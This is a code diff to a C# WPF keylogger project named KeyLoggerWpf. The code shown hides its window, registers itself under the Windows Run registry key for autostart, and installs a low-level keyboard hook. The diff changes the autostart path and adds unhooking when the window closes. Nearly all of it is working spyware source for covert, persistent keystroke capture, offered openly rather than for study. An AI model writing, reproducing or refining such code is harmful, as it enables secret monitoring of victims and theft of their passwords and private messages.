@@ -36,7 +36,7 @@ namespace KeyLoggerWpf
             InitializeComponent();
             this.Visibility = Visibility.Hidden;
             // Добавление в автозагрузку
-            string ExePath = System.Windows.Forms.Application.ExecutablePath;
+            string ExePath = AppDomain.CurrentDomain.BaseDirectory;
             string name = "KeyLogger";
             RegistryKey reg;
             reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
@@ -51,9 +51,15 @@ namespace KeyLoggerWpf
 
             _hookID = SetHook(_proc);
 
-           
 
+            Closed += MainWindow_Closed;
         }
+
+        private void MainWindow_Closed(object sender, EventArgs e)
+        {
+            UnhookWindowsHookEx(_hookID);
+        }
+
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
